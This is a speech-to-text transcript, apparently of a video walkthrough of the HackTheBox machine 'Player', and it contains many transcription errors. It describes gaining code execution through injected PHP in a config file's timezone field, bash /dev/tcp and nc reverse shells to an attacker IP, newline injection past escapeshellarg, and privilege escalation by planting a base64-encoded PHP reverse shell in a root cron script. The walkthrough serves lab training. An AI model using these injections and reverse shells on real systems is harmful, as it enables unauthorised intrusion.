workspace so now we can do a whole different post and keep going through this and eventually set the poison config file and I'm not going to step through this entire thing the process should be relatively straightforward once you have all the variables but the project path we want to change this now to be ver dub dub dub chat and the reason why we want to change this is because now we got that data director and everything existing but what doesn't exist is users dot PHP so that is in our favor so let's just do Ural and code all characters % to F I don't think it likes slashes so I'm just going to encode them because this part you only have one chance because once it writes that config and creates all this user stuff then you're just going to be Sol because you can't delete things so very critical we do this correctly it wants a password confirm I believe so we'll do password confirm please subscribe and then let's see project name that should be fine let's make sure project name is not used elsewhere project underscore name see project data yeah I'm going to do a project name is equal to something so project name will be please subscribe and project path project path we probably want this to be the actual path they would go and then finally we want time zone so and time zone is equal to America ascent to F New York it's a valid time zone and what we have to do is close this out I think I think we do a double quote this to close out so where is it writing time zone so we're writing right here so we're doing the double quote and parentheses to close that out and then putting this and we can write our code so we'll just do system and request epoch and then a comment to comment everything that is after that you're all in code and we're really gonna hope this works password confirm product name I'm just glancing over over everything because again we screw this up we may have to revert the box send we got a success so now if we go to chat player htb config dot PHP should exist and if we say hips ik equals Who am I yes we got a shell so let's go to a root shell and to show exactly what happened so fer dub dub dub chat we them config dot PHP and look at timezone we can see there's a where we wrote and then here's us injecting the double quote parentheses and then a shell command and then getting rid and I think this could have been avoided is if they prevented something from calling config dot PHP directly is one of the quickest ways to avoid this maybe I'm not sure but a lot of times when you can write directly into PHP files specifically like config because that's so common you have a lot of attack surface so let's just get the shell on the box and we'll do the pre Vasque the other way actually yeah we can get a shot on the box real quick that won't take long intercept on okay change request method ash - I like this dev tcp 1010 14 - 9001 zero and one that looks right let's just preface this with fast - seed and sure this is running in bash send it to repeater because I never type things correctly the first time NCL vnb 9001 send like I said never type things correctly the first time if that looks correct 10 test monkey a verse shell cheat sheet turn off go here - I yes I do something silly just like forget to your land code this that's better URL encoding helps so now we're a shell as dub dub dub - data let's go back up a little bit and go to the other one so if we go to the github cody add remote code execution exploit this one and then let's add something into the code to proxy it and see exactly what this does to see if is doing the same thing or something different chances are it's doing something different because it requires a username so let's go into this directory them exploit by look at a print statement this is Python - because there's a space so let's see session who they're using this so we can just do s dot proxies update and HTTP one 27001 8080 so python exploit why does it give us s is not defined Oh session dot proxies okay normally when I do it session I just have the name as s but data session that's fine so Python exploit PI HTTP dev player htb Peter go here grab his password oh this is probably doing the same exact thing we did manually I don't need to step through this I just realized what was happening I think so 10 10 14 to nine thousand one Linux it's the only one intended way but I guess you're seeing quick way to step through a Python script so this is the command it's going to run huh it's funny they're doing the same thing I do so let's see please ice cube NC l vnp 9001 on command on your VPS oh well that's weird they want both of these are and I think I don't know if I like the script anymore so okay well logging in so authenticate password so we're getting the home page after we log in searching for hacker and doing NC 10 1014 - on 9001 and calling in bash I don't know if I like this from this again yes doesn't seem to be working let's see dev player htb now is it right it wanted the trailing slash Wow so ok let's add that session back in and look at it which I didn't delete the line session proxies update HTTP one 27001 8080 okay intercept on run these commands that it wants yes we ran that okay yes this search file type has o % 0 way this is new line so that's why the vulnerability I don't know what 23 is okay that's what that is but I bet if we undo this ctrl shift you yep new line percent is your way so adds a new line there and that's it so it's just a straight-up cold - probably system or something so we had vulnerability I guess you can look at the script and analyze it see exactly what it's doing but I'm getting tired of talking so let's just hurry up and finish this video so what was that script name root shell contact - shell it is this buff dot PHP if we head this we want to edit this code so if we bi cat the file we can see that just going to do echo - N and we get base64 and overwrite this whole file so let's go here I append test monkey up so let's just grab the PHP reverse shell all right here the shell dot PHP paste and we will do ten ten fourteen to nine thousand one base64 shell dot PHP and - wzo to put it on one line and then not do that correctly because we need the silly PHP tags sock sock open sure okay copy close that here paste a 64 - D - this weird file so if we cat the file we now got a thing NCL vnp 9001 and we just wait for the new minute to hit which would happen in 30 seconds date 20 seconds okay 15 seconds has happened any second we should get a callback if we did this correctly and there we go so now we have the shell we do PWD we o root so that is the other way to do the box if you didn't want to do PHP serialization I hope you enjoyed the video take care and I will see you all next week actually I lied not knowing how that one code execution worked as bothering me so let's just go look at this real quick so I'm gonna go back to Cody adds github so github Cody add go here and let's go to burp target no we want proxy history and we want to look at components file manager controller dot PHP with the action search so components file man controller dot php' and we want to look at search so search is going to call File Manager search okay so let's see what is this command search is that what is file file man and I can't tell you manager there we go so it's getting files out of this class file manager dot PHP so let's see is that here yes it is so let's see search ok so this search string is equal to post search string so is equal to this and it is doing escape shell ARDS so it's preventing any like arguments from being called we did search file type so it's doing the same thing again escaping any arguments so let's see we're search file type is used right here and it's used in the output of shell exact so what we're doing is taking this code and what it's running is starting this shell exec command and we are injecting right here with this search file type and we inserted a new line so boom new line and then we put our nasty commands and then added a comment so now shell exact runs this fine command doesn't work those line break then runs or a nasty command so that's exactly what is going on and I guess the main flaw here I'm not sure if it's well probably not patched but when you have this the developer was expecting the escape shell ugh to be able to invent all avenues of coatings injection however xscape shell ugh did not filter the new wine so that's where we got the code execution problem with that being said hope you guys enjoy the Box take care I'll see you next week